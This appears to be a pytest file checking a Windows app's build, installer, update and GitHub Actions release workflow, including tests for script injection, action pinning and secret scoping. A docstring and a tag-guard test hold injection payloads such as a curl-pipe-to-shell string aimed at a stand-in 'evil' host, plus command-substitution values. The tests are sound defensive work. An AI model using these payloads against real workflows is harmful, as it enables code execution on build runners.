"""The pieces the Windows build depends on.

The frozen binaries themselves are built and smoke-tested by the release
workflow on a Windows runner — that is the only place they can be. What is
testable here is everything the build stands on: the icon generator, the
``--version`` path that lets CI verify a windowed binary without a display, and
the spec and workflow actually being present and consistent.

The ``--version`` flag exists specifically because a windowed PyInstaller build
cannot otherwise be checked. The first hand-built exe died at import from an
over-eager ``--exclude-module email`` and reported it in a message box, which a
CI runner would never have seen. ``--version`` returns before Tk is touched but
after the whole import graph has been walked, so that failure becomes a
non-zero exit code instead.
"""
import os
import shutil
import struct
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from pingerplot import __version__

REPO = Path(__file__).resolve().parent.parent


# --- the --version escape hatch --------------------------------------------

def test_version_flag_prints_the_version_and_exits():
    out = subprocess.run([sys.executable, str(REPO / "main.py"), "--version"],
                         capture_output=True, text=True, timeout=60)
    assert out.returncode == 0, out.stderr
    assert __version__ in out.stdout


def test_version_flag_does_not_need_a_display():
    """The whole point: it must return before Tk is created, so a headless CI
    runner can use it to prove a frozen binary's import graph."""
    src = (REPO / "pingerplot" / "gui.py").read_text(encoding="utf-8")
    body = src[src.index("def main() -> None:"):]
    before_tk = body[:body.index("tk.Tk(")]
    assert "--version" in before_tk and "return" in before_tk, \
        "--version must return before the first Tk window is created"


def test_version_walks_the_import_graph_that_broke():
    """gui -> geoip -> urllib.request -> email. If that chain is ever severed,
    the CI gate stops meaning anything."""
    pytest.importorskip("tkinter", reason="gui.py imports tkinter at module level")
    import pingerplot.gui  # noqa: F401
    assert "pingerplot.geoip" in sys.modules
    assert "urllib.request" in sys.modules
    assert "email" in sys.modules


# --- the icon --------------------------------------------------------------

def test_icon_is_a_valid_multi_size_ico():
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon

    data = make_icon.build_ico()
    reserved, kind, count = struct.unpack("<HHH", data[:6])
    assert (reserved, kind) == (0, 1), "not an ICO header"
    assert count == len(make_icon.SIZES)

    seen = []
    for i in range(count):
        w, h, _c, _r, planes, bpp, size, offset = struct.unpack(
            "<BBBBHHII", data[6 + 16 * i:22 + 16 * i])
        assert planes == 1 and bpp == 32
        assert offset + size <= len(data), "entry points past the end of the file"
        assert data[offset:offset + 8] == b"\x89PNG\r\n\x1a\n", "not PNG-compressed"
        seen.append(w or 256)
    assert seen == list(make_icon.SIZES)


def test_icon_includes_the_sizes_windows_actually_asks_for():
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon
    # 16 for the title bar and taskbar, 32 for alt-tab, 256 for large icons in
    # Explorer. Missing one makes Windows scale another and it looks it.
    for needed in (16, 32, 256):
        assert needed in make_icon.SIZES


def test_icon_is_written_to_disk(tmp_path):
    sys.path.insert(0, str(REPO / "packaging"))
    import make_icon
    dest = tmp_path / "nested" / "app.ico"
    assert make_icon.main([str(dest)]) == 0
    assert dest.exists() and dest.stat().st_size > 1000


# --- the spec and workflow -------------------------------------------------

def test_the_spec_exists_and_is_tracked():
    """.gitignore carries a blanket *.spec for PyInstaller's generated ones.
    The authored spec must be exempted or the build silently has no recipe."""
    spec = REPO / "packaging" / "pingerplot.spec"
    assert spec.exists()
    ignore = (REPO / ".gitignore").read_text(encoding="utf-8")
    assert "!packaging/*.spec" in ignore


def test_the_spec_does_not_exclude_anything_the_app_imports():
    """The regression that started all this. Excluding email broke
    urllib.request, which geoip and the webhook both need."""
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    dangerous = ("email", "urllib", "http", "json", "socket", "ctypes",
                 "tkinter", "select", "csv", "queue", "ipaddress", "zlib",
                 "zipfile", "subprocess", "hashlib", "tempfile")
    for mod in dangerous:
        assert f'"{mod}"' not in spec.split("EXCLUDES")[1].split("]")[0], \
            f"the spec excludes {mod!r}, which the app imports"


def test_the_spec_builds_both_binaries():
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    assert 'name="PingerPlot"' in spec
    assert 'name="pingerplot-headless"' in spec
    assert "console=False" in spec and "console=True" in spec


def test_the_spec_does_not_upx_pack():
    """UPX packing is a large share of PyInstaller AV false positives, and this
    binary already looks suspicious to a heuristic scanner without help."""
    spec = (REPO / "packaging" / "pingerplot.spec").read_text(encoding="utf-8")
    builders = spec.count("EXE(") + spec.count("COLLECT(")
    assert builders == 3, "expected two programs and one shared folder"
    assert spec.count("upx=False") == builders


# --- the installer and the portable zip (1.4) ---------------------------------

ISS = REPO / "packaging" / "PingerPlot.iss"


def test_the_installer_keeps_its_appid():
    """Windows recognises an existing install by AppId. Changing it would make
    every upgrade a second, parallel installation."""
    assert "AppId={{64B8717F-5BDB-4070-9A45-47C311BC5DB5}" in ISS.read_text(encoding="utf-8")


def test_the_installer_is_per_user_and_waits_for_the_app():
    iss = ISS.read_text(encoding="utf-8")
    from pingerplot import winplatform
    assert "PrivilegesRequired=lowest" in iss, "the installer must not ask for admin"
    assert f'#define AppMutex "{winplatform.MUTEX_NAME}"' in iss
    assert f'#define AppUserModelID "{winplatform.APP_ID}"' in iss
    assert 'ValueName: "{#AppName}"' in iss and winplatform.RUN_VALUE == "PingerPlot", \
        "uninstalling must remove the Start with Windows entry the app writes"


def test_the_installer_restarts_the_app_after_an_update():
    """updater.apply runs Setup with /relaunch=1 and quits; without this [Run]
    entry an update would leave PingerPlot closed."""
    iss = ISS.read_text(encoding="utf-8")
    assert 'Parameters: "--updated"; Flags: nowait; Check: WantsRelaunch' in iss
    assert "{param:relaunch|0}" in iss


def _build_windows():
    sys.path.insert(0, str(REPO / "packaging"))
    try:
        import build_windows
    finally:
        sys.path.pop(0)
    return build_windows


def test_the_updater_asks_for_the_files_the_build_makes():
    """Every installed copy reads these names from every later release: they
    can never change, and the two lists can never drift apart."""
    from pingerplot import updater
    bw = _build_windows()
    assert (updater.INSTALLER_NAME, updater.PORTABLE_NAME) == (bw.INSTALLER_NAME, bw.PORTABLE_NAME)
    assert updater.GUI_EXE == bw.EXES[0]
    assert updater.MANIFEST_NAME == "latest.json"


def test_the_release_publishes_what_the_build_makes():
    bw = _build_windows()
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    attach = wf[wf.index("- name: Attach to the release"):]
    for name in (bw.INSTALLER_NAME, bw.PORTABLE_NAME, "SHA256SUMS.txt", "latest.json"):
        assert f"dist/{name}" in attach, f"the release doesn't attach {name}"
    assert "dist/PingerPlot.exe" not in attach, "1.3's bare executables are gone"
    code = "\n".join(ln for ln in attach.splitlines() if not ln.strip().startswith("#"))
    assert code.index("files+=(dist/latest.json)") > code.index("dist/SHA256SUMS.txt"), \
        "latest.json must go up after the files it names"
    assert "--clobber" not in code, "a published file must never be replaced"


_FAKE_GH = """#!/bin/bash
# Stands in for gh: the release exists, its files are in $GH_ASSETS (name TAB
# digest per line, as the step's --jq prints them), uploads go to $GH_LOG.
case "$1 $2" in
  "release view") exit 0 ;;
  "release upload") echo "$(basename "$4") ${*:5}" >> "$GH_LOG"; exit 0 ;;
  "release create") echo "create" >> "$GH_LOG"; exit 0 ;;
esac
if [ "$1" = api ]; then
  [ -n "$GH_API_FAILS" ] && exit 1
  cat "$GH_ASSETS"; exit 0
fi
exit 2
"""

_DIST = {"PingerPlot-Setup.exe": b"setup", "PingerPlot-win64.zip": b"zip",
         "SHA256SUMS.txt": b"sums", "latest.json": b"{}"}


def _digest(data):
    import hashlib
    return "sha256:" + hashlib.sha256(data).hexdigest()


@pytest.fixture
def attach_step(tmp_path):
    """The workflow's "Attach to the release" script, run as GitHub runs it
    (bash -eo pipefail) against a fake gh, in a folder with dist/ built."""
    bash = shutil.which("bash")
    if not bash:
        pytest.skip("no bash to run the extracted step")
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("- name: Attach to the release"):]
    blocks = _run_blocks(step)
    head, _nl, rest = blocks[0][1].partition("\n")
    assert head.strip() == "|"
    script = textwrap.dedent(rest)
    assert "gh release upload" in script, "extracted the wrong thing"

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "gh").write_bytes(_FAKE_GH.encode())
    (bin_dir / "gh").chmod(0o755)
    work = tmp_path / "work"
    (work / "dist").mkdir(parents=True)
    for name, data in _DIST.items():
        (work / "dist" / name).write_bytes(data)
    assets, log = tmp_path / "assets.tsv", tmp_path / "gh.log"

    def run(on_release, api_fails=False):
        # Bytes: write_text would end lines with CRLF on Windows, and gh on the
        # runner prints LF.
        assets.write_bytes("".join(f"{n}\t{d}\n" for n, d in on_release.items()).encode())
        log.write_text("")
        env = {**os.environ, "TAG": "v9.9.9", "GITHUB_REPOSITORY": "owner/repo",
               "GH_ASSETS": str(assets), "GH_LOG": str(log),
               "PATH": str(bin_dir) + os.pathsep + os.environ.get("PATH", "")}
        if api_fails:
            env["GH_API_FAILS"] = "1"
        p = subprocess.run([bash, "-eo", "pipefail", "-c", script], cwd=work, env=env,
                           capture_output=True, text=True, timeout=60)
        uploads = [ln.split()[0] for ln in log.read_text().splitlines() if ln != "create"]
        return p, uploads, log.read_text()

    return run


def test_a_new_release_gets_every_file_manifest_last(attach_step):
    p, uploads, log = attach_step({})
    assert p.returncode == 0, p.stdout + p.stderr
    assert uploads == list(_DIST), "every file, latest.json last"
    assert "--clobber" not in log


def test_a_rerun_on_the_same_build_uploads_only_whats_missing(attach_step):
    """Re-running publish after it failed part way: the files already up are
    the same bytes, so they're left alone and the rest go up."""
    done = {n: _digest(_DIST[n]) for n in ("PingerPlot-Setup.exe", "PingerPlot-win64.zip")}
    p, uploads, _ = attach_step(done)
    assert p.returncode == 0, p.stdout + p.stderr
    assert uploads == ["SHA256SUMS.txt", "latest.json"]
    p, uploads, _ = attach_step({n: _digest(d) for n, d in _DIST.items()})
    assert p.returncode == 0 and uploads == []


@pytest.mark.parametrize("old_digest", [_digest(b"an earlier build"), ""])
def test_a_published_file_is_never_replaced(attach_step, old_digest):
    """A rebuild of a published tag (new signature timestamps, so new bytes)
    stops before uploading anything: Scoop and winget recorded the old hash.
    A file with no digest on record can't be shown to match, so it stops too."""
    on_release = {n: _digest(d) for n, d in _DIST.items()}
    on_release["PingerPlot-win64.zip"] = old_digest
    del on_release["latest.json"]
    p, uploads, _ = attach_step(on_release)
    assert p.returncode != 0
    assert uploads == [], "nothing may go up once a published file differs"
    assert "never replaced" in p.stdout


def test_a_failed_lookup_stops_the_job(attach_step):
    """If the release's files can't be listed, nothing is uploaded as if the
    release were empty."""
    p, uploads, _ = attach_step({}, api_fails=True)
    assert p.returncode != 0 and uploads == []


def _record_build(bw, monkeypatch, tmp_path):
    """build_windows with every stage replaced by a note of its running."""
    dist = tmp_path / "dist"
    app = dist / "PingerPlot"
    monkeypatch.setattr(bw, "DIST", dist)
    monkeypatch.setattr(bw, "APP_DIR", app)
    order = []

    def freeze():
        order.append("pyinstaller")
        app.mkdir(parents=True)
        for exe in bw.EXES:
            (app / exe).write_bytes(b"MZ")

    monkeypatch.setattr(bw, "version_resource", lambda: order.append("version"))
    monkeypatch.setattr(bw, "icon", lambda: order.append("icon"))
    monkeypatch.setattr(bw, "pyinstaller", freeze)
    monkeypatch.setattr(bw, "authenticode", lambda p: order.append(("sign", p.name)))
    monkeypatch.setattr(bw, "portable_zip", lambda: order.append("zip"))
    monkeypatch.setattr(bw, "installer", lambda sign=False: order.append(("installer", sign)))
    monkeypatch.setattr(bw, "checksums", lambda: order.append("sums"))
    monkeypatch.setattr(bw, "manifest", lambda: order.append("manifest"))
    return order, app


def test_the_build_runs_whole_or_in_the_release_jobs_two_halves(tmp_path, monkeypatch):
    bw = _build_windows()
    order, app = _record_build(bw, monkeypatch, tmp_path)
    bw.main([])
    assert order == ["version", "icon", "pyinstaller", "zip", ("installer", False), "sums", "manifest"]

    order.clear()
    bw.main(["--program"])
    assert order == ["version", "icon", "pyinstaller"]

    order.clear()
    stale = tmp_path / "dist" / bw.PORTABLE_NAME
    stale.write_bytes(b"from an earlier run")
    bw.main(["--package", "--sign"])
    assert order == ["icon", ("sign", "PingerPlot.exe"), ("sign", "pingerplot-headless.exe"),
                     "zip", ("installer", True), "sums", "manifest"], \
        "the exes must be signed before the zip and the installer pack them"
    assert not stale.exists(), "--package must not leave an earlier run's download"
    assert all((app / exe).is_file() for exe in bw.EXES), "--package keeps the program folder"


def test_the_build_refuses_what_it_cant_do_before_touching_anything(tmp_path, monkeypatch):
    bw = _build_windows()
    order, _app = _record_build(bw, monkeypatch, tmp_path)
    for argv in (["--sign"], ["--program", "--sign"], ["--package", "--sign", "--no-installer"],
                 ["--program", "--package"], ["--bogus"]):
        with pytest.raises(SystemExit):
            bw.main(argv)
    with pytest.raises(SystemExit, match="needs the program folder"):
        bw.main(["--package"])
    assert order == [] and not (tmp_path / "dist").exists()


def test_a_signed_installer_has_inno_setup_sign_the_uninstaller_and_setup(monkeypatch):
    """Inno Setup makes the uninstaller while it compiles, so only its own
    SignTool can sign it. The command reaches ISCC through its command line,
    which doesn't undo the \\" Python would write for a literal quote: hence
    Inno's $q."""
    bw = _build_windows()
    calls = []
    monkeypatch.setattr(bw, "find_iscc", lambda: "ISCC.exe")
    monkeypatch.setattr(bw.subprocess, "run", lambda args, **kw: calls.append(args))
    bw.installer(sign=True)
    tool = [a for a in calls[0] if a.startswith("/S")]
    assert tool == [f"/Sauthenticode=pwsh -NoProfile -NonInteractive -File $q{bw.AUTHENTICODE}$q $f"]
    assert "/DSign" in calls[0] and '"' not in tool[0]
    iss = ISS.read_text(encoding="utf-8")
    block = iss[iss.index("#ifdef Sign"):iss.index("#endif", iss.index("#ifdef Sign"))]
    assert "SignTool=authenticode" in block and "SignedUninstaller=yes" in block

    calls.clear()
    bw.installer(sign=False)
    assert not [a for a in calls[0] if a.startswith(("/S", "/DSign"))], "an unsigned build signs nothing"

    monkeypatch.setattr(bw, "find_iscc", lambda: None)
    with pytest.raises(SystemExit):
        bw.installer(sign=True)


def test_ci_builds_and_tests_the_release_files_on_every_push():
    ci = (REPO / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
    job = ci[ci.index("\n  package:"):]
    for step in ("packaging/build_windows.py", "packaging/test_portable.ps1",
                 "packaging/test_installer.ps1", "packaging/test_update.ps1", "--require-hashes"):
        assert step in job, f"the package job doesn't run {step}"


def test_the_release_workflow_verifies_before_it_uploads():
    """An unverified upload is how a broken binary reaches people; one the
    previous version can't update to is how it stops reaching them. The tests
    run on the signed files, the ones that are published: signing rewrites
    every exe, and Inno Setup runs again to sign the uninstaller."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    jobs = _jobs(wf)
    assert "Smoke-test the frozen GUI" in jobs["windows"]
    verify = jobs["verify"]
    assert "needs: [windows, authenticode]" in verify
    assert "name: pingerplot-windows-${{ needs.windows.outputs.tag }}" in verify, \
        "verify must test the signed downloads the publish job uploads"
    for step in ("./packaging/test_portable.ps1 -Publisher $env:PUBLISHER",
                 "./packaging/test_installer.ps1 -Setup dist\\PingerPlot-Setup.exe -Version $v"
                 " -Publisher $env:PUBLISHER",
                 "./packaging/test_update.ps1"):
        assert step in verify, f"the verify job doesn't run {step}"
    assert 'PUBLISHER: "CN=James Cupps, O=James Cupps"' in verify
    assert "needs: [windows, verify]" in jobs["sign"], \
        "the manifest must not be signed for files that failed their tests"


def test_the_update_test_never_uses_the_release_key():
    """It signs its own release folder with a throwaway key; the release key
    belongs to the sign job alone."""
    helper = (REPO / "packaging" / "update_test_helper.py").read_text(encoding="utf-8")
    assert "os.urandom(32)" in helper and "key_file" not in helper
    ps1 = (REPO / "packaging" / "test_update.ps1").read_text(encoding="utf-8")
    assert "UPDATE_SIGNING_KEY" not in ps1 and "PINGERPLOT_SIGNING_KEY" not in ps1


def test_the_workflow_checks_the_gui_exit_code_correctly():
    """A GUI-subsystem exe does not set $LASTEXITCODE in PowerShell -- the
    variable keeps whatever the previous command left, so the check silently
    passes a broken build. Start-Process -Wait -PassThru is the correct form."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    gui_step = wf[wf.index("Smoke-test the frozen GUI"):wf.index("Smoke-test the frozen headless")]
    # Only the commands, not the comment that explains why $LASTEXITCODE is
    # wrong here -- naming the trap is the opposite of falling into it.
    code = "\n".join(ln for ln in gui_step.splitlines()
                     if not ln.strip().startswith("#"))
    assert "-Wait -PassThru" in code
    assert "$LASTEXITCODE" not in code


def test_the_workflow_publishes_checksums():
    """Something to compare a download with that doesn't depend on Windows'
    view of the signature."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    assert "SHA256SUMS.txt" in wf
    assert "SHA256" in wf


def test_the_workflow_creates_the_release_if_absent():
    """Pushing a tag does not create a release -- GitHub leaves that to you --
    so on the ordinary path (tag a version, let CI build it) there is nothing
    to upload to and `gh release upload` alone fails with "release not found".
    That is exactly what happened on the first v1.3.1 build."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Attach to the release"):]
    assert "gh release create" in step
    assert "gh release view" in step, "should check before creating"
    assert "--notes-from-tag" in step, "the annotated tag already holds the notes"


def test_the_workflow_refuses_a_tag_without_a_build_recipe():
    """Dispatching against a tag from before packaging/ existed produced a
    baffling failure in whichever step first touched a missing file."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    assert "packaging/pingerplot.spec" in wf.split("Check this tag can actually be built")[1][:600]


# --- workflow hardening ----------------------------------------------------
#
# The release job holds `permissions: contents: write` and a GH_TOKEN that can
# publish releases, so two rules apply to it. Both are checked here rather than
# left to review, because both are the kind of thing a later edit reintroduces
# without noticing.

WORKFLOWS = sorted((REPO / ".github" / "workflows").glob("*.yml"))


def _run_blocks(text):
    """Every `run:` script in a workflow, as (line_number, body) pairs.

    Textual rather than YAML-parsed on purpose: the project is
    dependency-free and CI installs only pytest, so PyYAML is not available.
    """
    lines = text.splitlines()
    out = []
    for i, line in enumerate(lines):
        stripped = line.lstrip()
        if not stripped.startswith("run:"):
            continue
        indent = len(line) - len(stripped)
        body = [stripped[len("run:"):]]
        for nxt in lines[i + 1:]:
            if not nxt.strip():
                body.append("")
                continue
            if len(nxt) - len(nxt.lstrip()) <= indent:
                break
            body.append(nxt)
        out.append((i + 1, "\n".join(body)))
    return out


def test_the_run_block_finder_actually_finds_them():
    """This test's own instrument, checked before it certifies anything."""
    sample = (
        "steps:\n"
        "  - name: one\n"
        "    run: echo ${{ inputs.tag }}\n"
        "  - name: two\n"
        "    env:\n"
        "      X: ${{ inputs.tag }}\n"
        "    run: |\n"
        "      echo \"$X\"\n"
        "      echo ${{ github.ref_name }}\n"
        "  - name: three\n"
        "    run: echo safe\n"
    )
    blocks = _run_blocks(sample)
    assert len(blocks) == 3
    assert "${{ inputs.tag }}" in blocks[0][1]
    assert "${{ github.ref_name }}" in blocks[1][1]
    assert "${{" not in blocks[2][1], "must not swallow the env: block above it"


def test_no_workflow_interpolates_into_a_shell_script():
    """The canonical GitHub Actions script-injection pattern: the runner
    substitutes ${{ }} into the script TEXT before bash ever sees it, so a
    dispatch input of `"; curl -s https://evil/x | sh; #` executes. Values
    reach the shell through env: instead, where bash reads them as data.

    Only principals with write access can dispatch, so this is defence in
    depth against a compromised collaborator account rather than a path from
    outside -- but the release job publishes the binaries people download."""
    for wf in WORKFLOWS:
        for lineno, body in _run_blocks(wf.read_text(encoding="utf-8")):
            assert "${{" not in body, (
                f"{wf.name}:{lineno} interpolates into a run: script; "
                f"pass the value through env: instead")


def test_the_release_workflow_validates_the_dispatch_tag():
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Work out which tag we are building"):wf.index("actions/checkout")]
    assert "TAG_INPUT: ${{ inputs.tag }}" in step, "input must arrive via env:"
    assert "refusing to build" in step, "an unexpected tag shape must be refused"


def test_every_action_is_pinned_by_commit_sha():
    """Tags are mutable. A retagged or compromised action would otherwise run
    in a job holding contents:write and a publish-capable token."""
    import re
    uses = re.compile(r"^\s*(?:- )?uses:\s*(\S+)", re.M)
    for wf in WORKFLOWS:
        for ref in uses.findall(wf.read_text(encoding="utf-8")):
            assert "@" in ref, f"{wf.name}: unversioned action {ref!r}"
            pin = ref.split("@", 1)[1]
            assert re.fullmatch(r"[0-9a-f]{40}", pin), (
                f"{wf.name}: {ref!r} is pinned by tag, not commit SHA")


def test_pinned_actions_say_which_version_they_are():
    """A bare 40-character SHA is unreadable and unreviewable. The trailing
    comment is the convention Dependabot reads and rewrites."""
    import re
    for wf in WORKFLOWS:
        for line in wf.read_text(encoding="utf-8").splitlines():
            if re.match(r"^\s*(?:- )?uses:\s*\S+@[0-9a-f]{40}", line):
                assert re.search(r"#\s*v\d", line), f"{wf.name}: {line.strip()!r}"


def test_dependabot_keeps_the_pins_fresh():
    """A pinned SHA goes stale silently; this is what stops that."""
    cfg = REPO / ".github" / "dependabot.yml"
    assert cfg.exists(), "SHA pinning without Dependabot just means stale actions"
    assert "github-actions" in cfg.read_text(encoding="utf-8")


def test_the_tag_guard_rejects_a_newline_as_well_as_a_bad_shape(tmp_path):
    """Not redundant with the version-shape check: a glob's * matches a
    newline, so "v1.3.1\ninjected=1" passes the shape test and then writes two
    lines into $GITHUB_OUTPUT -- inventing a step output nothing declared.

    The guard is extracted from the workflow and actually executed, rather
    than eyeballed. A workflow step is only reviewable if something runs it."""
    bash = shutil.which("bash")
    if not bash:
        pytest.skip("no bash to run the extracted guard")

    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    step = wf[wf.index("Work out which tag we are building"):wf.index("actions/checkout")]
    blocks = _run_blocks(step)
    assert len(blocks) == 1, "expected exactly one run: block in the tag step"
    # First line is YAML's block-scalar indicator (" |"), not shell.
    head, _nl, rest = blocks[0][1].partition("\n")
    assert head.strip() in ("|", "|-", ">"), f"unexpected run: form {head!r}"
    script = textwrap.dedent(rest)
    assert "GITHUB_OUTPUT" in script, "extracted the wrong thing"

    # A real file, not os.devnull: under Git Bash on Windows that name is not
    # the null device, so `>> "$GITHUB_OUTPUT"` creates a file called `nul` in
    # the repository -- which git then refuses to index.
    sink = tmp_path / "github_output"

    def _run(tag):
        return subprocess.run(
            [bash, "-c", script],
            env={**os.environ, "TAG_INPUT": tag, "REF_NAME": "",
                 "GITHUB_OUTPUT": str(sink)},
            capture_output=True, text=True, timeout=30)

    for good in ("v1.3.1", "v10.2.30", "v2.0.0-rc.1"):
        assert _run(good).returncode == 0, f"refused {good!r}"
    for bad in ("v1.3.1\ninjected=1", "not-a-version", "v1.3", "",
                '"; curl -s https://evil/x | sh; #', "v1.3.1;id", "v1.3.1$(id)",
                "v1.3.1 --clobber"):
        assert _run(bad).returncode != 0, f"accepted {bad!r}"

    # A -signtest tag is marked as one, so nothing gets published; a release
    # tag never is.
    for tag, signtest in (("v1.4.3-signtest.1", "true"), ("v1.4.3", "false")):
        sink.write_text("")
        assert _run(tag).returncode == 0
        assert sink.read_text().splitlines() == [f"name={tag}", f"signtest={signtest}"]


def test_a_signtest_tag_is_built_signed_and_tested_but_never_published():
    """A tag like v1.4.3-signtest.1 is for trying a change to signing: the
    version check accepts the version in the source plus the suffix, and the
    two jobs that would publish (the manifest and the release) don't run."""
    bash = shutil.which("bash")
    if not bash:
        pytest.skip("no bash to run the extracted check")
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    jobs = _jobs(wf)
    for name in ("sign", "publish"):
        assert "if: needs.windows.outputs.signtest != 'true'" in jobs[name], name
    import re
    for name in ("windows", "authenticode", "verify"):
        assert not re.search(r"^    if:", jobs[name], re.M), f"{name} must run for a signing test too"

    step = wf[wf.index("- name: Check the tag matches the version"):wf.index("- name: Test the source")]
    (_ln, body), = _run_blocks(step)
    script = textwrap.dedent(body.partition("\n")[2])
    line = 'v=$(python -c "from pingerplot import __version__; print(__version__)")'
    assert line in script
    script = script.replace(line, "v=1.4.3")      # pure bash from here, no Python needed
    for tag, ok in (("v1.4.3", True), ("v1.4.3-signtest.1", True), ("v1.4.4", False),
                    ("v1.4.4-signtest.1", False), ("v1.4.3-rc.1", False), ("v1.4.33", False)):
        rc = subprocess.run([bash, "-c", script], env={**os.environ, "TAG": tag},
                            capture_output=True, text=True, timeout=30).returncode
        assert (rc == 0) == ok, f"{tag}: exit {rc}"


# --- rules 3-5: no third-party code beside the write token ---------------------

def _jobs(text):
    """``{job_name: job_text}`` for a workflow, textually (no PyYAML in CI)."""
    import re
    body = text[text.index("\njobs:\n") + len("\njobs:\n"):]
    heads = list(re.finditer(r"^  ([A-Za-z0-9_-]+):\s*$", body, re.M))
    return {m.group(1): body[m.start():heads[i + 1].start() if i + 1 < len(heads) else len(body)]
            for i, m in enumerate(heads)}


def test_the_job_finder_finds_the_release_jobs():
    jobs = _jobs((REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8"))
    assert set(jobs) == {"windows", "authenticode", "verify", "sign", "publish"}


def test_only_the_sign_job_sees_the_signing_key():
    """The key that every installed copy trusts is worth more than the write
    token: it never shares a job with anything installed from PyPI. The only
    other secrets are the Azure IDs, in the authenticode job."""
    import re
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    jobs = _jobs(wf)
    allowed = {"sign": {"UPDATE_SIGNING_KEY"},
               "authenticode": {"AZURE_CLIENT_ID", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID"}}
    for name, job in jobs.items():
        read = set(re.findall(r"secrets\.([A-Za-z0-9_]+)", job))
        assert read <= allowed.get(name, set()), f"job {name!r} reads {sorted(read)}"
    sign = "\n".join(ln for ln in jobs["sign"].splitlines() if not ln.strip().startswith("#"))
    assert "UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}" in sign
    assert "contents: read" in sign and "contents: write" not in sign
    for forbidden in ("pip ", "pytest", "PyInstaller", "setup-python", "build_windows"):
        assert forbidden not in sign, f"the sign job runs {forbidden.strip()}"
    assert "python3 -I packaging/signing.py sign" in sign
    assert "trap 'rm -f \"$key\"' EXIT" in sign, "the key file must not outlive the step"
    assert sign.index("signing.py sign") < sign.index("signing.py verify"), \
        "the manifest must be verified against the app's key before it is published"


def test_publishing_waits_for_the_signature():
    jobs = _jobs((REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8"))
    assert "needs: [windows, authenticode, verify, sign]" in jobs["publish"]


def test_the_authenticode_job_runs_nothing_from_pypi_and_never_runs_the_program():
    """It can sign anything as James Cupps, which is worth as much as the
    release key: a compromised build dependency must never run beside it. So
    it gets the program folder the build job froze, signs the two exes
    without running them, and makes the zip and the installer with the
    standard library and Inno Setup."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    jobs = _jobs(wf)
    job = "\n".join(ln for ln in jobs["authenticode"].splitlines() if not ln.strip().startswith("#"))
    assert "environment: release" in job
    assert "id-token: write" in job and "contents: read" in job and "contents: write" not in job
    assert "needs: windows" in job
    for forbidden in ("pip ", "pytest", "PyInstaller", "requirements-build", "choco ",
                      "test_portable", "test_installer", "test_update", "--self-test",
                      "--version", "PingerPlot.exe"):
        assert forbidden not in job, f"the authenticode job runs {forbidden.strip()}"
    assert "uses: azure/login@" in job
    assert "Install-Module -Name ArtifactSigning -RequiredVersion 0.1.8" in job
    assert "python -I packaging/build_windows.py --package --sign" in job
    assert "name: pingerplot-program-${{ needs.windows.outputs.tag }}" in job
    assert job.index("build_windows.py --package --sign") < job.index("upload-artifact")
    ps1 = (REPO / "packaging" / "authenticode.ps1").read_text(encoding="utf-8")
    assert "Import-Module ArtifactSigning -RequiredVersion 0.1.8" in ps1, \
        "the script and the workflow must agree on the module version"


def test_only_the_authenticode_job_can_sign_in_to_azure():
    """Azure trusts the release environment's OIDC token. No other job asks
    for one or runs in that environment."""
    jobs = _jobs((REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8"))
    for name, job in jobs.items():
        if name != "authenticode":
            assert "id-token" not in job and "environment:" not in job, name
    for wf in WORKFLOWS:
        if wf.name != "release.yml":
            text = wf.read_text(encoding="utf-8")
            assert "id-token: write" not in text or wf.name == "pages.yml", wf.name
            assert "azure/login" not in text, wf.name


def test_only_a_job_that_runs_no_third_party_code_can_write():
    """The build job installs PyInstaller and pytest from PyPI and executes
    them. It used to hold contents:write; a compromised build dependency could
    then have published a release or pushed to the repository."""
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    top = wf[:wf.index("\njobs:\n")]
    assert "contents: write" not in top, "write must not be the workflow default"
    for name, job in _jobs(wf).items():
        code = "\n".join(ln for ln in job.splitlines() if not ln.strip().startswith("#"))
        if "contents: write" in code:
            for forbidden in ("pip ", "pytest", "PyInstaller", "python "):
                assert forbidden not in code, f"job {name!r} can write and runs {forbidden.strip()}"
        else:
            assert "contents: read" in code, f"job {name!r} does not declare read-only"


def test_checkout_never_leaves_the_token_in_git_config():
    for wf in WORKFLOWS:
        lines = wf.read_text(encoding="utf-8").splitlines()
        for i, line in enumerate(lines):
            if "uses: actions/checkout@" in line:
                block = "\n".join(lines[i + 1:i + 6])
                assert "persist-credentials: false" in block, f"{wf.name}:{i + 1}"


def test_release_build_tooling_is_installed_by_hash():
    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    installs = [b for _ln, b in _run_blocks(wf) if "pip install" in b]
    assert installs, "the release job installs nothing?"
    for body in installs:
        assert "--require-hashes" in body and "-r packaging/requirements-build.txt" in body, body
        assert "--only-binary=:all:" in body, "an sdist build would run unpinned build backends"


def test_every_build_requirement_is_pinned_and_hashed():
    import re
    text = (REPO / "packaging" / "requirements-build.txt").read_text(encoding="utf-8")
